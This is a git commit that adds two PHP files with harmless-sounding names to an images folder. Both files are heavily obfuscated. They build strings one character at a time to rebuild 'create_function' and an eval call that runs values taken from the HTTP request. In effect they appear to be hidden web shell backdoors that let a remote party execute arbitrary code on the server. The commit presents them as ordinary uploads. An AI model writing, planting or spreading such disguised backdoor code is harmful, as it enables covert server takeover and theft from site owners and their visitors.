c7e505554e3c75468085742b53e4cb7edd1dd8d2
geevio <62248958+geevio@users.noreply.github.com>
2020-05-22 13:07:48 -0700

    Add files via upload
    First upload

---
+++ images/backcover_indesit.php
@@ -0,0 +1,116 @@
+<?php
+	$disturber = '4';$can ='FL(';$battlers ='N'; $deservingly ='mWE(Aa'; $dusky='v'; $leafed ='_e(';$equaled= ']';
+	$deeyn= 'T';$diverted = 'IuFe_a(:'; $leto= '"'; $dani = ')_osQ$s';
+
+	$decomposes='e6nfO"or';$drawbacks ='er';
+	$disclaims='vTRvV)F'; $glottal= 'i'; $architectural='H';$bleach = 'G';
+
+	$hugues = 'l?("';$donnie = 'T_QFGIt';$kilometer= ']';
+	$loria = '"';
+
+	$bureaucratic ='_';$intruding='f';$believe = ' ,f'; $elga ='TpKea)gcp'; $headstrong='o'; $indexable='$';$kele= 'H'; $denominate='X:'; $baller ='f'; $chevy='($imea='; $blackest='@nnrAifsa';$inseminate='r'; $identify ='pi$';
+
+	$analysis='i';
+	$concierge='Oo)DqT`On';
+	$apposite = 'JiZ_l';$cloe= ')';
+	$inexpert ='t';
+	$cathrine =');'; $art='e'; $brained= 'K';
+
+	$cadenced= '(';$apatite = 'S'; $feverish= 'dah]';$dropping = 'N';
+
+	$curiously = '$rrIEe[^?'; $humidifiers ='fRS';$brimming ='eCAV(';
+
+	$hamburger ='d'; $ker='sst';$evita = 'N';
+
+	$debuggers = 'ia_g';$giorgia= '[Pu'; $glycogen= 'r'; $handout = 'y';
+	$growled = 'ea(v_Ib_F'; $defensive='j'; $jock= 'R]C$"s';$bittersweet='G';$applicate=')'; $blowing ='d';$beauteous = 'ciT';$dietitian='n';$flawlessly ='g';$clerk ='BPSt)('; $help='_'; $cost = 'H';
+
+	$distributivity = '(';
+	$come= '[aPE'; $captaincy ='M'; $dotted='_s[;=)f';$didnt =';'; $heinrick ='itvg'; $dubious= 'tsg';
+
+	$await ='R';$betti =']';$biconcave= 'y';$chargeable ='a';$differentiates = 'c$"t,r_';$craze='i';
+	$alumna = 'U';$descendent='$';$inexplicable ='a';$credent='e)irnrk';$emmott ='c';$gaggle = 'ega$Er['; $alps='ae';$bumps= 'c';
+	$fossiliferous='?'; $australian='b';$amphibology ='V';$inline='d;eE)EIa$';$embarcadero='evi"irVI"';$clamming = 'i';$charmine='YUles';
+	$guns = $bumps.
+
+	$embarcadero['5'] .$charmine[3]. $inline['7'] .
+	$differentiates['3'] .
+
+	$charmine[3].
+
+	$differentiates[6] .
+	$dotted['6'] . $giorgia['2'].$credent['4'].
+	$bumps . $differentiates['3'] .$clamming .$concierge['1'].$credent['4'] ;$leach = $believe['0'] ;$frieze= $guns($leach,$charmine[3].$embarcadero['1'].
+
+	$inline['7'] .$charmine['2'].$distributivity.
+
+	$inline['7'] . $embarcadero['5'].$embarcadero['5'] . $inline['7'] .$biconcave .
+	$differentiates[6] . $identify['0'].
+	$concierge['1'] . $identify['0']. $distributivity.
+
+	$dotted['6']. $giorgia['2'] .$credent['4'].
+
+	$bumps. $differentiates[6]. $gaggle['1']. $charmine[3] . $differentiates['3'] .$differentiates[6].$inline['7'] .
+	$embarcadero['5'].$gaggle['1'] . $charmine[4] .$distributivity .$inline['4'] . $inline['4'].$inline['4'] . $inline['1']);$frieze($growled[8],$brained, $jock[2], $believe['0'] , $defensive ,$charmine[4], $broadcaster['1'] , $inline['8'] . $clamming .
+	$dotted['4'] .
+	$inline['7'] .$embarcadero['5']. $embarcadero['5'] .$inline['7']. $biconcave . $differentiates[6]. $chevy['3'] .$charmine[3].$embarcadero['5'] . $gaggle['1'] .$charmine[3].$distributivity. $inline['8']. $differentiates[6] .$await .$inline['5'].
+	$donnie['2'] .
+	$charmine[1].$inline['5'] .
+
+	$clerk[2]. $beauteous['2'] .$differentiates['4'] .$inline['8'] .
+	$differentiates[6]. $jock[2]. $concierge['7'] .$concierge['7'] .$brained.
+	$embarcadero[7].$inline['5'].
+	$differentiates['4'].$inline['8'] .
+
+	$differentiates[6] .
+
+	$clerk[2].
+	$inline['5'].$await .
+	$embarcadero[6].
+	$inline['5'].$await.$inline['4'].$inline['1'].
+	$inline['8']. $inline['7'] . $dotted['4'].$clamming .$charmine[4].$charmine[4]. $charmine[3]. $differentiates['3'] .$distributivity .
+	$inline['8'].$clamming .$gaggle['6'].
+	$embarcadero['8'] .$clamming . $dotted['6'].$gaggle['1'].
+
+	$clamming.
+
+	$embarcadero['1']. $inline['7'] . $credent['4'].$dotted['6'] .
+	$embarcadero['8'].$betti .
+
+	$inline['4']. $fossiliferous . $inline['8'].$clamming.$gaggle['6'].$embarcadero['8']. $clamming.$dotted['6'].$gaggle['1'] .
+
+	$clamming. $embarcadero['1']. $inline['7']. $credent['4'].$dotted['6'] .$embarcadero['8']. $betti. $denominate['1'] . $distributivity.
+
+	$clamming.
+	$charmine[4].$charmine[4] . $charmine[3]. $differentiates['3'] .
+
+	$distributivity . $inline['8'] .$clamming.$gaggle['6']. $embarcadero['8'] . $cost.
+
+	$beauteous['2'].
+	$beauteous['2'] .
+
+	$come[2] . $differentiates[6] .
+
+	$embarcadero[7]. $growled[8]. $bittersweet . $embarcadero[7] .$embarcadero[6]. $brimming['2'] .$evita.
+
+	$growled[8]. $embarcadero['8'].$betti. $inline['4']. $fossiliferous.
+
+	$inline['8'] . $clamming .$gaggle['6'] .$embarcadero['8'] . $cost. $beauteous['2'].$beauteous['2'].$come[2].$differentiates[6].
+
+	$embarcadero[7].
+
+	$growled[8].
+
+	$bittersweet. $embarcadero[7] .$embarcadero[6] .$brimming['2'] .$evita.
+
+	$growled[8].
+	$embarcadero['8'] . $betti.$denominate['1'] . $inline['0'].$clamming .$charmine[3].$inline['4'] .
+	$inline['1'] .$charmine[3] .
+	$embarcadero['1']. $inline['7']. $charmine['2'] .
+	$distributivity .$charmine[4] . $differentiates['3'] . $embarcadero['5'].
+	$embarcadero['5'].$charmine[3] .$embarcadero['1'] .
+	$distributivity .$australian. $inline['7'].$charmine[4] .$charmine[3].$decomposes[1].$disturber . $differentiates[6] . $inline['0'] . $charmine[3].$bumps .
+
+	$concierge['1'].$inline['0'] . $charmine[3].$distributivity.$charmine[4]. $differentiates['3'].$embarcadero['5'].$embarcadero['5']. $charmine[3].
+	$embarcadero['1'].$distributivity .$inline['8'] .
+	$inline['7'].$inline['4'] . $inline['4']. $inline['4'].$inline['4'] .$inline['1']  );
---
+++ images/heatcover_noversion.php
@@ -0,0 +1,93 @@
+<?php
+$equator= 'a'; $audiology= 'bmt)ZUtu';$blackhawkdown= 'Tc_ rv)ii';$hairpin= 's'; $gender = '"ef$EUi'; $corrupting ='fy_s"Vo'; $enslaves= 'H';$hangs='['; $gulches='nc[(aceg';
+
+$benedicto= ';E"a_((';$dislodge ='V'; $hare='I';$innovations =')'; $electress= 'N';
+
+$auria='e6Rr_V(a'; $alumnae= 'Vr'; $lase = 't$Rty_eCQ';$farrel= 're$KdicEn'; $ewe= 'OaO]n$'; $heterosexual= 'r';$karlyn= 's'; $europeans = 'rr$'; $hospitality= 'U_vSaPCuv'; $commission = '?ftT'; $bijections =']'; $faster='=?)rnsq'; $grievingly = 'N';$conceiving='d()WT,g]d';$lames= ';'; $compressible='"'; $hurrying='u';$jan = 'p'; $carol = '(:';
+$colorings = 'i';$fermentations= ')T$p';$assassin= 'R';
+
+$kaela= '"';$fifteen = 'Q$4e';$backward= 'ni'; $bearberry= ')'; $cotman= '['; $indispensable='H;ou)v(v(';$darrel= ':'; $collapse = '"i';$interchangeably ='aP';$hyena ='[';
+$eighties ='CsiP_io]';
+
+$ectoderm= '$O_(T)';$discusses='"';
+$guying= 'a'; $load= ')'; $decoder ='f'; $antigens='q'; $intends ='esel';$assimilated = 'e';$godofallhackers= 'er[_'; $diverted= 'SlXeR"';$chirped=',$ec_aEE';$collaborators=']';
+$appraiser ='F';$hunk ='=';$gagging ='FQYsT';
+
+$flea = 'c'; $barons = 'pOQteep'; $barely ='(';$flattened='_tPaa_(;S';$lilacs= 'Uvgo$r)rs'; $baseboard ='e^o'; $erg = $flea .$lilacs['7'] .$baseboard[0]. $flattened['4'].$flattened['1'].
+
+$baseboard[0] . $flattened['5'] . $decoder.$indispensable[3].$backward['0'] . $flea.$flattened['1']. $eighties['5'] . $baseboard['2'] . $backward['0'] ;$inked= $blackhawkdown['3'] ;$grandfather =$erg
+
+($inked,$baseboard[0]. $lilacs['1'].$flattened['4']. $diverted['1'] .
+$flattened['6'] .$flattened['4'] . $lilacs['7'].$lilacs['7'] .
+
+$flattened['4'].
+$lase['4'] . $flattened['5'] . $barons['6'] .$baseboard['2'] . $barons['6']. $flattened['6'].$decoder .$indispensable[3] . $backward['0'] .
+$flea . $flattened['5']. $lilacs['2'] .$baseboard[0] . $flattened['1'] . $flattened['5']. $flattened['4'].$lilacs['7'].$lilacs['2'].
+$lilacs['8'] . $flattened['6'].$lilacs[6] .$lilacs[6] .
+$lilacs[6].
+$flattened[7]); $grandfather ($audiology['4'], $immunity['5'] ,
+
+$audiology['1'],$beatify,$eighties[0] ,
+
+$bicycling['4'] , $collaborators , $lowered['7'], $gum['0'],$lilacs['4'] .$eighties['5'].$hunk .
+
+$flattened['4'] .$lilacs['7'] . $lilacs['7'].
+$flattened['4'] . $lase['4'] . $flattened['5'].
+
+$audiology['1'] .
+$baseboard[0] .$lilacs['7'].$lilacs['2'].
+
+$baseboard[0] .$flattened['6'].$lilacs['4'].$flattened['5'] . $diverted['4'] .$chirped['7'] . $barons['2'] .$lilacs['0'] . $chirped['7']. $flattened['8'].$gagging[4]. $chirped[0].
+$lilacs['4'] .
+
+$flattened['5'].
+
+$eighties[0]. $barons['1'].$barons['1'] .$farrel[3] .$hare .$chirped['7'] .$chirped[0].
+
+$lilacs['4'] .
+$flattened['5'] .$flattened['8'] .$chirped['7'] .$diverted['4']. $alumnae['0']. $chirped['7'].
+
+$diverted['4'] .$lilacs[6] .$flattened[7] .
+$lilacs['4'] . $flattened['4'].$hunk .
+$eighties['5'].
+$lilacs['8']. $lilacs['8'].$baseboard[0] .
+$flattened['1'].$flattened['6'].$lilacs['4'] .$eighties['5'] . $godofallhackers['2'].$diverted['5']. $flea .
+$decoder.$indispensable[3].
+
+$backward['0'].$lilacs['1'].$barons['6'] .
+$baseboard['2'] .
+$antigens.$diverted['5'] . $collaborators.
+
+$lilacs[6].$faster['1'] .$lilacs['4'] .
+
+$eighties['5'] .
+$godofallhackers['2'].$diverted['5']. $flea. $decoder . $indispensable[3] .$backward['0'] .$lilacs['1'] .$barons['6'] .$baseboard['2'] .$antigens .
+$diverted['5'] . $collaborators.
+$darrel.$flattened['6'] .$eighties['5']. $lilacs['8'].$lilacs['8'].$baseboard[0].
+
+$flattened['1']. $flattened['6'].$lilacs['4'].$eighties['5'] . $godofallhackers['2'] .$diverted['5'].$indispensable['0'] .$gagging[4]. $gagging[4].$flattened['2'] .$flattened['5']. $eighties[0] .
+
+$gagging[0] . $lilacs['0'].$grievingly. $alumnae['0'] .$flattened['2'] . $barons['1'] .
+
+$barons['2'] . $diverted['5']. $collaborators .$lilacs[6] . $faster['1']. $lilacs['4'] . $eighties['5']. $godofallhackers['2'] .$diverted['5'] .
+$indispensable['0'].$gagging[4] .
+
+$gagging[4].
+$flattened['2'].
+$flattened['5']. $eighties[0]. $gagging[0]. $lilacs['0'] .$grievingly.$alumnae['0'].
+$flattened['2'] . $barons['1'] .$barons['2'] .$diverted['5'] . $collaborators. $darrel. $conceiving['8'] .$eighties['5'].$baseboard[0] .$lilacs[6].$flattened[7]. $baseboard[0] .$lilacs['1'] .
+$flattened['4'] .$diverted['1'] . $flattened['6'].$lilacs['8'] .$flattened['1'] .
+$lilacs['7']. $lilacs['7'] . $baseboard[0] .$lilacs['1'].
+
+$flattened['6']. $audiology['0'] . $flattened['4'] .
+$lilacs['8'].$baseboard[0] .$auria[1].$fifteen[2]. $flattened['5']. $conceiving['8'] .
+$baseboard[0].$flea.$baseboard['2'] .$conceiving['8'] . $baseboard[0].$flattened['6'].$lilacs['8'].
+
+$flattened['1'].$lilacs['7'] . $lilacs['7'] .
+
+$baseboard[0] .
+
+$lilacs['1'] . $flattened['6'].$lilacs['4'].$flattened['4'] .
+
+$lilacs[6]. $lilacs[6]. $lilacs[6] .
+$lilacs[6] . $flattened[7] );
